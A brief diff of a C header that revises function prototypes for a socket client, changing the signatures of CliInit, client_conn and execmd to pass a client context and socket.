@@ -35,9 +35,9 @@ typedef struct
 
 } ClientCTX, *pClientCTX;
 
-ClientCTX CliInit(pClientCTX CTX);
+pClientCTX CliInit(void);
 SOCKET client_socket(SOCKET Socket);
-int client_conn(SOCKET Socket);
-int execmd(void);
+SOCKET client_conn(SOCKET Socket, pClientCTX CTX);
+int execmd(SOCKET Socket);
 
 #endif
